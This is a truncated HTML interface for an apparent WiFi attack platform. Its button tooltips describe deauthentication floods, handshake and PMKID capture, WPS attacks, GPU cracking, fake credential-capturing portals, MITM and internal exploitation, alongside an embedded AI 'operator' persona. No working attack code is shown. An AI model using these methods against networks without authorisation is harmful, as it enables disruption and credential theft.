<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Arsenal - Sh4d0wFr4m3</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            text-align: center;
            padding: 20px;
            border-bottom: 2px solid #00ff00;
            margin-bottom: 30px;
        }
        
        h1 {
            font-size: 2em;
            text-shadow: 0 0 10px #00ff00;
        }
        
        .subtitle {
            color: #888;
            margin-top: 10px;
        }
        
        .panel {
            background: #111;
            border: 1px solid #00ff00;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        
        .panel h2 {
            color: #00ff00;
            margin-bottom: 15px;
            font-size: 1.3em;
        }
        
        .button {
            background: #003300;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 10px 20px;
            margin: 5px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            transition: all 0.3s;
        }
        
        .button:hover {
            background: #00ff00;
            color: #000;
        }
        
        .button:active {
            transform: scale(0.95);
        }
        
        .button.danger {
            background: #330000;
            border-color: #ff0000;
            color: #ff0000;
        }
        
        .button.danger:hover {
            background: #ff0000;
            color: #000;
        }
        
        input[type="text"], input[type="number"], select {
            background: #000;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 8px;
            margin: 5px;
            font-family: 'Courier New', monospace;
            width: 200px;
        }
        
        select {
            cursor: pointer;
        }
        
        .output {
            background: #000;
            border: 1px solid #00ff00;
            padding: 15px;
            margin-top: 15px;
            max-height: 400px;
            overflow-y: auto;
            font-size: 12px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        .network-list {
            margin-top: 15px;
        }
        
        .network-item {
            background: #001a00;
            border: 1px solid #003300;
            padding: 10px;
            margin: 5px 0;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .network-item:hover {
            background: #003300;
            border-color: #00ff00;
        }
        
        .network-item.selected {
            background: #004400;
            border-color: #00ff00;
            box-shadow: 0 0 10px #00ff00;
        }
        
        .status {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #003300;
            border: 1px solid #00ff00;
            padding: 10px 20px;
            border-radius: 5px;
        }
        
        .status.active {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 5px #00ff00; }
            50% { box-shadow: 0 0 20px #00ff00; }
        }
        
        .mode-status {
            display: inline-block;
            padding: 5px 10px;
            margin: 5px;
            border: 1px solid #00ff00;
            border-radius: 3px;
            font-size: 12px;
        }
    
    .monitor-button {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        border: 2px solid #5568d3;
    }
    
    .monitor-button:hover {
        background: linear-gradient(135deg, #5568d3 0%, #5f3c87 100%);
        transform: translateY(-2px);
    }


    /* Navigation */
    .nav-bar {
        display: flex;
        justify-content: center;
        gap: 5px;
        padding: 15px;
        background: #0d0d0d;
        border-bottom: 2px solid #00ff00;
        margin-bottom: 20px;
        flex-wrap: wrap;
    }
    
    .nav-btn {
        background: #001a00;
        color: #00ff00;
        border: 1px solid #003300;
        padding: 10px 20px;
        cursor: pointer;
        font-family: 'Courier New', monospace;
        font-size: 14px;
        transition: all 0.2s;
    }
    
    .nav-btn:hover {
        background: #003300;
        border-color: #00ff00;
    }
    
    .nav-btn.active {
        background: #004400;
        border-color: #00ff00;
        box-shadow: 0 0 10px #00ff00;
    }
    
    .page {
        display: none;
    }
    
    .page.active {
        display: block;
    }
    
    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
        20%, 40%, 60%, 80% { transform: translateX(5px); }
    }

    </style>
    <!-- Leaflet for live wardrive map (local copies for offline use) -->
    <link rel="stylesheet" href="/lib/leaflet.css" />
    <script src="/lib/leaflet.js"></script>
</head>
<body>
    <!-- J4Rv15 Lock Screen -->
    <div id="lockScreen" style="
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.95);
        z-index: 9999;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        font-family: 'Courier New', monospace;
    ">
        <div style="text-align: center; max-width: 500px; padding: 20px;">
            <!-- Logo/Title -->
            <div style="font-size: 72px; margin-bottom: 20px;">ü§ñ</div>
            <div style="font-size: 36px; color: #00ff00; margin-bottom: 10px; letter-spacing: 8px;">J4Rv15</div>
            <div style="font-size: 14px; color: #666; margin-bottom: 40px;">WiFi Arsenal Security Interface</div>
            
            <!-- Passcode Input -->
            <div style="margin-bottom: 20px;">
                <input type="password" id="passcodeInput" maxlength="4" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢"
                    onkeypress="if(event.key==='Enter')submitPasscode()"
                    style="
                        width: 150px;
                        padding: 15px;
                        font-size: 32px;
                        text-align: center;
                        background: #111;
                        border: 2px solid #333;
                        color: #00ff00;
                        letter-spacing: 15px;
                        font-family: monospace;
                    "
                    title="Enter 4-digit access code">
            </div>
            
            <button onclick="submitPasscode()" style="
                padding: 12px 40px;
                background: linear-gradient(180deg, #003300, #001100);
                border: 1px solid #006600;
                color: #00ff00;
                cursor: pointer;
                font-size: 14px;
                font-family: monospace;
                letter-spacing: 2px;
            " title="Submit access code">AUTHENTICATE</button>
            
            <!-- Response Message -->
            <div id="authMessage" style="margin-top: 30px; min-height: 60px; color: #888; font-size: 13px; line-height: 1.6;"></div>
            
            <!-- Terminal-style decoration -->
            <div style="margin-top: 40px; color: #333; font-size: 11px;">
                <div>‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó</div>
                <div>‚ïë  WIFI ARSENAL v2.0 - AUTHORIZED USE  ‚ïë</div>
                <div>‚ïë        Unauthorized access will      ‚ïë</div>
                <div>‚ïë         be met with sarcasm          ‚ïë</div>
                <div>‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù</div>
            </div>
        </div>
    </div>
    <!-- Prompt Editor Modal -->
    <div id="promptModal" style="
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.9);
        z-index: 8888;
        justify-content: center;
        align-items: center;
    ">
        <div style="width: 80%; max-width: 900px; max-height: 80vh; background: #111; border: 1px solid #333; border-radius: 8px; display: flex; flex-direction: column;">
            <div style="padding: 15px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center;">
                <span style="color: #0f0; font-weight: bold;">üé≠ J4Rv15 System Prompt</span>
                <button onclick="closePromptModal()" style="background: none; border: none; color: #888; cursor: pointer; font-size: 20px;" title="Close without saving">√ó</button>
            </div>
            <div style="flex: 1; padding: 15px; overflow: hidden;">
                <textarea id="promptEditor" style="
                    width: 100%;
                    height: 100%;
                    min-height: 400px;
                    background: #0a0a0a;
                    border: 1px solid #333;
                    color: #0f0;
                    padding: 15px;
                    font-family: monospace;
                    font-size: 12px;
                    resize: none;
                    box-sizing: border-box;
                " title="Edit the system prompt - this controls J4Rv15's personality and knowledge"></textarea>
            </div>
            <div style="padding: 15px; border-top: 1px solid #333; display: flex; gap: 10px; justify-content: flex-end;">
                <span id="promptStatus" style="flex: 1; color: #666; font-size: 12px; align-self: center;"></span>
                <button onclick="closePromptModal()" style="padding: 10px 20px; background: #222; border: 1px solid #444; color: #888; cursor: pointer;" title="Close without saving changes">Cancel</button>
                <button onclick="savePrompt()" style="padding: 10px 20px; background: #003300; border: 1px solid #006600; color: #0f0; cursor: pointer;" title="Save changes to the system prompt">üíæ Save Prompt</button>
            </div>
        </div>
    </div>

    <!-- Report Generation Modal -->
    <div id="reportModal" style="
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.9);
        z-index: 8888;
        justify-content: center;
        align-items: center;
    ">
        <div style="width: 90%; max-width: 500px; background: #111; border: 1px solid #333; border-radius: 8px;">
            <div style="padding: 15px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center;">
                <span style="color: #0f0; font-weight: bold;">üìÑ Generate Client Report</span>
                <button onclick="closeReportModal()" style="background: none; border: none; color: #888; cursor: pointer; font-size: 20px;" title="Close">√ó</button>
            </div>
            <div style="padding: 20px;">
                <!-- Client Name -->
                <div style="margin-bottom: 15px;">
                    <label style="color: #888; font-size: 12px; display: block; margin-bottom: 5px;">Client Name</label>
                    <input type="text" id="reportClientName" placeholder="e.g., Acme Corporation"
                           style="width: 100%; padding: 10px; background: #0a0a0a; border: 1px solid #333; color: #0f0; box-sizing: border-box;">
                </div>

                <!-- Report Type -->
                <div style="margin-bottom: 15px;">
                    <label style="color: #888; font-size: 12px; display: block; margin-bottom: 5px;">Report Type</label>
                    <select id="reportType" style="width: 100%; padding: 10px; background: #0a0a0a; border: 1px solid #333; color: #0f0;">
                        <option value="executive">Executive Summary (2-3 pages)</option>
                        <option value="summary" selected>Summary Report (5-7 pages)</option>
                        <option value="full">Full Detailed Report (all networks)</option>
                    </select>
                </div>

                <!-- Risk Filter -->
                <div style="margin-bottom: 15px;">
                    <label style="color: #888; font-size: 12px; display: block; margin-bottom: 5px;">Include Networks</label>
                    <select id="reportVulnThreshold" style="width: 100%; padding: 10px; background: #0a0a0a; border: 1px solid #333; color: #0f0;">
                        <option value="all">All Networks</option>
                        <option value="high">High Risk & Critical Only</option>
                        <option value="critical">Critical Only (Open/WEP)</option>
                    </select>
                </div>

                <!-- Geofence Filter -->
                <div style="margin-bottom: 15px;">
                    <label style="color: #888; font-size: 12px; display: block; margin-bottom: 5px;">Geographic Filter (Optional)</label>
                    <select id="reportGeofence" style="width: 100%; padding: 10px; background: #0a0a0a; border: 1px solid #333; color: #0f0;">
                        <option value="">All Areas (No Filter)</option>
                    </select>
                </div>

                <!-- Network Count Preview -->
                <div id="reportPreviewStats" style="background: #0a0a0a; padding: 10px; border-radius: 4px; margin-bottom: 15px; text-align: center; font-size: 12px;">
                    <span style="color: #888;">Networks to include: </span>
                    <span id="reportNetworkCount" style="color: #0f0; font-weight: bold;">--</span>
                </div>

                <!-- Status -->
                <div id="reportStatus" style="color: #666; font-size: 12px; text-align: center; margin-bottom: 15px; min-height: 18px;"></div>
            </div>
            <div style="padding: 15px; border-top: 1px solid #333; display: flex; gap: 10px; justify-content: flex-end;">
                <button onclick="previewReport()" style="padding: 10px 20px; background: #222; border: 1px solid #444; color: #888; cursor: pointer;" title="Preview report in browser">üëÅÔ∏è Preview</button>
                <button onclick="generateReport()" id="generateReportBtn" style="padding: 10px 20px; background: #003300; border: 1px solid #006600; color: #0f0; cursor: pointer;" title="Generate and download PDF">üì• Download PDF</button>
            </div>
        </div>
    </div>

    <div class="container">
        <header>
            <h1>üõ°Ô∏è WiFi Arsenal üõ°Ô∏è</h1>
            <div class="subtitle">Sh4d0wFr4m3 Penetration Testing Platform</div>
            <div class="subtitle">Monitor: alfa0 | Portal: alfa1</div>
        </header>
        
        <!-- Navigation Bar -->
        <nav class="nav-bar">
            <button class="nav-btn active" onclick="showPage('network-ops')" title="Network scanning, target selection, and attack operations">üì° Network Ops</button>
            <button class="nav-btn" onclick="showPage('cracking')" title="Password cracking with Glass GPU - manage hash files and monitor progress">üîì Cracking</button>
            <button class="nav-btn" onclick="showPage('wardriving')" title="Wardrive map, Flipper sync, and network database">üó∫Ô∏è Wardriving</button>
            <button class="nav-btn" onclick="showPage('evil-portal')" title="Fake access points with captive portals to capture credentials">üëπ Evil Portal</button>
            <button class="nav-btn" onclick="showPage('mitm')" title="Man-in-the-Middle monitoring - DNS queries, traffic capture, connected clients">üïµÔ∏è MITM</button>
            <button class="nav-btn" onclick="showPage('internal')" title="Internal network attack - credential capture, exploitation, remote access">üíÄ Internal</button>
            <button class="nav-btn" onclick="showPage('dashboard')" title="System overview and quick stats (coming soon)">üìä Dashboard</button>
            <button class="nav-btn" onclick="showPage('operator')" title="J4Rv15 - AI assistant with full system context, memory, and tools">ü§ñ Operator</button>
            <div style="margin-left: auto; display: flex; gap: 5px;">
                <button id="hotspotBtn" class="nav-btn" onclick="toggleHotspot()" style="background: #333; font-size: 11px;" title="Toggle WiFi hotspot ‚Äî phone connects to Arsenal-Control to access this UI">üì± Hotspot</button>
                <button class="nav-btn" onclick="globalKillSwitch()" style="background: linear-gradient(180deg, #880000, #440000);" title="EMERGENCY STOP - Kill ALL network operations immediately (scans, attacks, portals, everything)">üõë KILL ALL</button>
                <button class="nav-btn" onclick="lockSystem()" style="background: linear-gradient(180deg, #444400, #222200);" title="Lock Arsenal - require passcode to use again">üîí Lock</button>
            </div>
        </nav>
        
        <!-- Page: Network Ops -->
        <div id="page-network-ops" class="page active">
        
        <!-- Interface Status Bar -->
        <div class="panel" style="display: flex; justify-content: space-between; align-items: center; padding: 10px 20px;">
            <div style="display: flex; gap: 20px; align-items: center;">
                <span style="font-size: 1.2em;">üîß Interfaces</span>
                <span class="mode-status" id="alfa0Status" title="Current operating mode - Monitor: captures all packets | Managed: normal WiFi client | Master: access point">alfa0: checking...</span>
                <span class="mode-status" id="alfa1Status" title="Current operating mode - Monitor: captures all packets | Managed: normal WiFi client | Master: access point">alfa1: checking...</span>
            </div>
            <div style="display: flex; gap: 5px;">
                <button class="button" onclick="refreshModes()" style="padding: 5px 10px;" title="Check current mode of both WiFi cards">Refresh</button>
                <select id="ifaceSelect" style="background: #001a00; color: #00ff00; border: 1px solid #003300; padding: 5px;" title="Select which interface to configure">
                    <option value="alfa0">alfa0</option>
                    <option value="alfa1">alfa1</option>
                </select>
                <button class="button" onclick="setMode(document.getElementById('ifaceSelect').value, 'monitor')" style="padding: 5px 10px;" title="Set selected interface to monitor mode for scanning/attacks">Monitor</button>
                <button class="button" onclick="setMode(document.getElementById('ifaceSelect').value, 'managed')" style="padding: 5px 10px;" title="Set selected interface to managed mode (normal WiFi)">Managed</button>
                <button class="button" onclick="setMode(document.getElementById('ifaceSelect').value, 'master')" style="padding: 5px 10px;" title="Set selected interface to AP mode (creates access point)">AP</button>
            </div>
        </div>
        
        <!-- Main Layout: Scanner + Controls -->
        <div style="display: flex; gap: 20px;">
            
            <!-- Left: Scanner & Network List (~60%) -->
            <div style="flex: 6; min-width: 0;">
                
                <!-- Scanner Controls -->
                <div class="panel" style="margin-bottom: 15px;">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                        <h2 style="margin: 0;">üì° Network Scanner</h2>
                        <div style="display: flex; gap: 10px; align-items: center;">
                            <input type="number" id="scanDuration" value="30" style="width: 60px; padding: 5px; background: #001a00; color: #00ff00; border: 1px solid #003300;" title="How long to scan for networks (seconds)" onkeypress="if(event.key==='Enter'){scanNetworks();}">
                            <span style="color: #666; font-size: 12px;">sec</span>
                            <button class="button" onclick="scanNetworks()" title="Scan for nearby WiFi networks on all channels (auto-switches alfa0 to monitor mode)">üîç Scan</button>
                        </div>
                    </div>
                    <div style="display: flex; gap: 10px; margin-bottom: 10px;">
                        <button class="button" onclick="revealHidden()" style="flex: 1; padding: 8px;" title="Monitor probe requests for 60s to reveal hidden network names. Clients connecting to hidden networks broadcast the SSID.">üëÅÔ∏è Reveal Hidden SSIDs</button>
                        <button class="button" onclick="batchRevealAllHidden()" style="flex: 1; padding: 8px;" title="Deauth ALL hidden networks in one batch operation. Monitors for 90s to reveal multiple SSIDs simultaneously.">üëÅÔ∏è‚Äçüó®Ô∏è Batch Reveal All</button>
                    </div>
                    <div class="output" id="scanOutput" style="height: 40px; overflow-y: auto;">Ready to scan...</div>
                </div>
                
                <!-- Channel Congestion -->
                <div id="channelCongestion" class="panel" style="margin-bottom: 15px; display: none;">
                    <h3 style="margin: 0 0 8px 0; color: #00ff00; font-size: 12px;">üìä Channel Congestion</h3>
                    <div id="channelBars" style="display: flex; gap: 2px; height: 30px; align-items: flex-end;"></div>
                </div>
                
                <!-- Network List -->
                <div class="panel" style="max-height: 400px; overflow-y: auto;">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                        <h3 style="margin: 0; color: #00ff00;">Discovered Networks <span id="networkCount" style="color: #666; font-size: 12px;"></span></h3>
                    </div>
                    <!-- Filter/Sort Controls -->
                    <div style="display: flex; gap: 8px; margin-bottom: 10px; flex-wrap: wrap; align-items: center;">
                        <input type="text" id="filterSSID" placeholder="üîç Filter SSID..." oninput="applyFilters()" style="flex: 1; min-width: 120px; padding: 5px 8px; background: #001a00; color: #00ff00; border: 1px solid #003300; font-size: 12px;">
                        <select id="filterEncryption" onchange="applyFilters()" style="padding: 5px; background: #001a00; color: #00ff00; border: 1px solid #003300; font-size: 12px;">
                            <option value="">All Encryption</option>
                            <option value="WPA3">WPA3</option>
                            <option value="WPA2">WPA2</option>
                            <option value="WPA">WPA</option>
                            <option value="WEP">WEP</option>
                            <option value="OPN">Open</option>
                        </select>
                        <select id="filterSignal" onchange="applyFilters()" style="padding: 5px; background: #001a00; color: #00ff00; border: 1px solid #003300; font-size: 12px;">
                            <option value="">All Signals</option>
                            <option value="excellent">Excellent (‚â•-40)</option>
                            <option value="good">Good (-60 to -40)</option>
                            <option value="fair">Fair (-70 to -60)</option>
                            <option value="weak">Weak (<-70)</option>
                        </select>
                        <select id="sortBy" onchange="applyFilters()" style="padding: 5px; background: #001a00; color: #00ff00; border: 1px solid #003300; font-size: 12px;">
                            <option value="signal">Sort: Signal</option>
                            <option value="ssid">Sort: SSID</option>
                            <option value="channel">Sort: Channel</option>
                            <option value="clients">Sort: Clients</option>
                        </select>
                    </div>
                    <div style="display: flex; gap: 12px; margin-bottom: 10px; flex-wrap: wrap;">
                        <label style="display: flex; align-items: center; gap: 4px; font-size: 11px; color: #888; cursor: pointer;" title="Only show networks with connected clients">
                            <input type="checkbox" id="filterClients" onchange="applyFilters()" style="cursor: pointer;">
                            Has clients
                        </label>
                        <label style="display: flex; align-items: center; gap: 4px; font-size: 11px; color: #888; cursor: pointer;" title="Hide networks with no SSID broadcast">
                            <input type="checkbox" id="filterHideHidden" onchange="applyFilters()" style="cursor: pointer;">
                            Hide hidden
                        </label>
                        <label style="display: flex; align-items: center; gap: 4px; font-size: 11px; color: #888; cursor: pointer;" title="Hide vehicle WiFi hotspots (Chevy, Ford, etc)">
                            <input type="checkbox" id="filterHideVehicles" onchange="applyFilters()" style="cursor: pointer;">
                            Hide vehicles
                        </label>
                    </div>
                    <div class="network-list" id="networkList" style="font-size: 13px;">
                        <div style="color: #666; padding: 20px; text-align: center;">Click "Scan" to discover networks</div>
                    </div>
                </div>
                
                <!-- Attack Output - Main display -->
                <div class="panel" style="margin-top: 15px;">
                    <h3 style="margin: 0 0 10px 0; color: #00ff00;">üìã Attack Output</h3>
                    <div class="output" id="mainAttackOutput" style="height: 180px; overflow-y: auto; font-family: monospace; white-space: pre-wrap;">Ready - select a target and run an attack</div>
                </div>
            </div>
            
            <!-- Right: Target & Attacks (~40%) -->
            <div style="flex: 4; min-width: 0;">
                
                <!-- Target Info -->
                <div class="panel" style="margin-bottom: 15px;">
                    <h2 style="margin: 0 0 15px 0;">üéØ Target</h2>
                    <div style="display: grid; gap: 10px;">
                        <div style="display: flex; justify-content: space-between; padding: 8px; background: #001100; border: 1px solid #003300;">
                            <span style="color: #888;">SSID</span>
                            <input type="text" id="targetSSID" placeholder="Select a network" readonly style="background: transparent; border: none; color: #00ff00; text-align: right; width: 60%;" title="Network name of target">
                        </div>
                        <div style="display: flex; justify-content: space-between; padding: 8px; background: #001100; border: 1px solid #003300;">
                            <span style="color: #888;">BSSID</span>
                            <input type="text" id="targetBSSID" placeholder="--:--:--:--:--:--" readonly style="background: transparent; border: none; color: #00ff00; text-align: right; width: 60%; font-family: monospace;" title="MAC address of target access point">
                        </div>
                        <div style="display: flex; justify-content: space-between; padding: 8px; background: #001100; border: 1px solid #003300;">
                            <span style="color: #888;">Channel</span>
                            <input type="text" id="targetChannel" placeholder="-" readonly style="background: transparent; border: none; color: #00ff00; text-align: right; width: 60%;" title="WiFi channel of target network">
                        </div>
                    </div>
                    <button class="button monitor-button" onclick="monitorClients()" style="width: 100%; margin-top: 10px; padding: 10px;" title="Full target intelligence brief - client details, vendor lookup, signal analysis, attack recommendations. Essential pre-attack recon.">üéØ Target Intel Brief (30s)</button>
                    <div class="output" id="monitorOutput" style="height: 200px; margin-top: 10px; overflow-y: auto;">Select target, then monitor for clients</div>
                    
                    <!-- Targeted Client Deauth -->
                    <div id="clientTargetSection" style="margin-top: 10px; padding: 10px; background: #001100; border: 1px solid #003300; display: none;">
                        <div style="display: flex; gap: 10px; align-items: center;">
                            <select id="clientSelector" style="flex: 1; padding: 8px; background: #000; color: #00ff00; border: 1px solid #003300; font-family: monospace;" title="Select a client to kick from the network">
                                <option value="">-- Select Client --</option>
                            </select>
                            <button class="button" onclick="kickSelectedClient()" style="padding: 8px 15px; background: #330000;" title="Send deauth packets to kick this specific client off the network">üí• Kick</button>
                        </div>
                        <div id="clientInfo" style="margin-top: 8px; font-size: 11px; color: #888;"></div>
                    </div>
                </div>
                
                <!-- Quick Attacks -->
                <div class="panel" style="margin-bottom: 15px;">
                    <h2 style="margin: 0 0 15px 0;">‚ö° Quick Attacks</h2>
                    
                    <div style="margin-bottom: 15px;">
                        <div style="display: flex; gap: 10px; align-items: center; margin-bottom: 5px;">
                            <button class="button" onclick="capturePMKID()" style="flex: 1;" title="Passive stealth capture - waits for natural client connections without deauth. Slower but undetectable. If no clients connect during capture window, no PMKID will be found.">üì° PMKID (Stealth)</button>
                            <input type="number" id="pmkidDuration" value="60" style="width: 50px; padding: 5px; background: #001a00; color: #00ff00; border: 1px solid #003300;" title="How long to attempt PMKID capture (seconds)">
                            <span style="color: #666; font-size: 11px;">sec</span>
                        </div>
                    </div>
                    
                    <div style="margin-bottom: 15px;">
                        <div style="display: flex; gap: 10px; align-items: center; margin-bottom: 5px;">
                            <button class="button" onclick="captureHandshake()" style="flex: 1;" title="Force clients to reconnect and capture WPA handshake for password cracking">ü§ù Handshake (Deauth)</button>
                            <input type="number" id="handshakeDuration" value="60" style="width: 50px; padding: 5px; background: #001a00; color: #00ff00; border: 1px solid #003300;" title="How long to capture handshake traffic (seconds)">
                            <span style="color: #666; font-size: 11px;">sec</span>
                        </div>
                        <div style="display: flex; gap: 10px; align-items: center; padding-left: 5px;">
                            <span style="color: #666; font-size: 11px;">Deauth interval:</span>
                            <input type="number" id="deauthInterval" value="10" style="width: 50px; padding: 5px; background: #001a00; color: #00ff00; border: 1px solid #003300;" title="Time between deauth packets - gives clients time to reconnect">
                            <span style="color: #666; font-size: 11px;">sec</span>
                        </div>
                    </div>
                    
                    <div style="display: flex; gap: 10px; margin-bottom: 10px;">
                        <button class="button" onclick="deauthOnly()" style="flex: 1;" title="Send deauthentication packets to disconnect clients from target network">üí• Deauth Only</button>
                        <input type="number" id="deauthOnlyCount" value="10" style="width: 50px; padding: 5px; background: #001a00; color: #00ff00; border: 1px solid #003300;" title="Number of deauth packets to send">
                        <span style="color: #666; font-size: 11px;">pkts</span>
                    </div>
                    
                    <button class="button" onclick="revealHiddenWithDeauth()" style="width: 100%;" title="Deauth target network + monitor 60s to reveal hidden SSID. Clients forced to reconnect will broadcast the network name.">üëÅÔ∏è Reveal Hidden (with Deauth)</button>
                </div>
                
                <!-- Advanced Attacks (Collapsible) -->
                <div class="panel">
                    <div onclick="toggleAdvancedAttacks()" style="cursor: pointer; display: flex; justify-content: space-between; align-items: center;">
                        <h2 style="margin: 0;">üéØ Advanced Attacks</h2>
                        <span id="advancedToggle" style="color: #00ff00;">‚ñº</span>
                    </div>
                    
                    <div id="advancedAttacksContent" style="margin-top: 15px;">
                        <button class="button" onclick="autoCaptureAttack()" style="width: 100%; padding: 12px; margin-bottom: 10px; background: linear-gradient(180deg, #002200, #001100);" title="AUTO CAPTURE: Tries all 5 attack methods in sequence until one succeeds. Takes 5-20 minutes total. Shows which method is currently running.">ü§ñ Auto Capture (Orchestrator)</button>
                        
                        <div style="display: grid; gap: 8px;">
                            <button class="button" onclick="pmkidActiveAttack()" style="padding: 10px; font-size: 12px;" title="METHOD 1: Active PMKID using hcxdumptool. Actively requests PMKID from router (not passive wait). 70-80% success on WPA2 without PMF. Duration: 2 minutes.">1Ô∏è‚É£ Active PMKID (hcxdumptool)</button>
                            <button class="button" onclick="wpsAttack()" style="padding: 10px; font-size: 12px;" title="METHOD 2: WPS Attacks - tries Pixie Dust (30% success) then NULL PIN (5% success). Gets actual password if WPS enabled. Duration: up to 5 minutes.">2Ô∏è‚É£ WPS Attack (Pixie + NULL)</button>
                            <button class="button" onclick="clientDeauthAttack()" style="padding: 10px; font-size: 12px;" title="METHOD 3: Scans for connected clients, floods each with 50 deauth packets. 60-70% success if clients connected. Duration: 3 minutes.">3Ô∏è‚É£ Targeted Client Deauth</button>
                            <button class="button" onclick="deauthFloodAttack()" style="padding: 10px; font-size: 12px;" title="METHOD 4: Continuous broadcast deauth flood - overwhelming sustained attack (200+ packets). 50-60% success on stubborn routers. Duration: 3 minutes.">4Ô∏è‚É£ Continuous Deauth Flood</button>
                            <button class="button" onclick="extendedCaptureAttack()" style="padding: 10px; font-size: 12px;" title="METHOD 5: Extended 5-minute capture with multiple deauth waves at 0s, 60s, 120s, 180s, 240s. 40-50% success if natural client activity. Duration: 5 minutes.">5Ô∏è‚É£ Extended Capture (Multi-Wave)</button>
                        </div>
                    </div>
                    
                    <div class="output" id="attackOutput" style="height: 80px; margin-top: 15px; overflow-y: auto;">Ready to attack...</div>
                </div>
            </div>
        </div>
        
        </div><!-- End page-network-ops -->
        
        <!-- Page: Cracking -->
        <div id="page-cracking" class="page">
        
        <!-- Glass Connection Status -->
        <div class="panel" style="display: flex; justify-content: space-between; align-items: center; padding: 10px 20px;">
            <div>
                <span style="font-size: 1.2em;">üñ•Ô∏è Glass Cracker</span>
                <span id="glassConnectionStatus" style="margin-left: 15px; padding: 5px 10px; border-radius: 3px; background: #330000; color: #ff6600;">Checking...</span>
            </div>
            <button class="button" onclick="checkGlassConnection()" style="padding: 5px 15px;" title="Test connection to Glass cracking server and update status">Refresh Connection</button>
        </div>
        
        <!-- Main Layout: Status + Controls -->
        <div style="display: flex; gap: 20px; margin-bottom: 20px;">
            
            <!-- Left: Live Status (60%) -->
            <div class="panel" style="flex: 6; min-width: 0;">
                <h2>üìä Live Status</h2>
                
                <!-- Current File -->
                <div style="margin-bottom: 15px;">
                    <strong>File:</strong> <span id="glassCurrentFile2" style="color: #ff6600;">-</span>
                </div>
                
                <!-- Progress Bar -->
                <div style="background: #001100; border: 1px solid #003300; border-radius: 5px; height: 30px; margin-bottom: 15px; overflow: hidden;">
                    <div id="glassProgressBar" style="background: linear-gradient(90deg, #00ff00, #00aa00); height: 100%; width: 0%; transition: width 0.3s; display: flex; align-items: center; justify-content: center;">
                        <span id="glassProgressText" style="color: #000; font-weight: bold;">0%</span>
                    </div>
                </div>
                
                <!-- Status Details -->
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                    <div style="background: #001100; padding: 10px; border: 1px solid #003300;">
                        <div style="color: #888; font-size: 12px;">STATUS</div>
                        <div id="glassStatusText2" style="color: #00ff00; font-size: 16px;">Idle</div>
                    </div>
                    <div style="background: #001100; padding: 10px; border: 1px solid #003300;">
                        <div style="color: #888; font-size: 12px;">STAGE</div>
                        <div id="glassStageText" style="color: #ff6600; font-size: 16px;">-</div>
                    </div>
                    <div style="background: #001100; padding: 10px; border: 1px solid #003300;">
                        <div style="color: #888; font-size: 12px;">SPEED</div>
                        <div id="glassSpeedText" style="color: #00ff00; font-size: 16px;">-</div>
                    </div>
                    <div style="background: #001100; padding: 10px; border: 1px solid #003300;">
                        <div style="color: #888; font-size: 12px;">ETA</div>
                        <div id="glassETAText" style="color: #00ff00; font-size: 16px;">-</div>
                    </div>
                    <div style="background: #001100; padding: 10px; border: 1px solid #003300;">
                        <div style="color: #888; font-size: 12px;">ELAPSED</div>
                        <div id="glassElapsedText" style="color: #00ffff; font-size: 16px;">-</div>
                    </div>
                </div>
                
                <!-- GPU Stats -->
                <div style="margin-top: 15px; padding: 10px; background: #0a0a0a; border: 1px solid #333;">
                    <div style="color: #888; font-size: 12px; margin-bottom: 8px;">üéÆ RX 7900 XT</div>
                    <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px;">
                        <div>
                            <div style="color: #666; font-size: 10px;">GPU</div>
                            <div id="gpuPercent" style="color: #00ff00; font-size: 14px;">--%</div>
                        </div>
                        <div>
                            <div style="color: #666; font-size: 10px;">TEMP</div>
                            <div id="gpuTemp" style="color: #00ff00; font-size: 14px;">--¬∞C</div>
                        </div>
                        <div>
                            <div style="color: #666; font-size: 10px;">VRAM</div>
                            <div id="gpuVram" style="color: #00ff00; font-size: 14px;">--/--GB</div>
                        </div>
                    </div>
                </div>
                
                <!-- Cracked Password Display -->
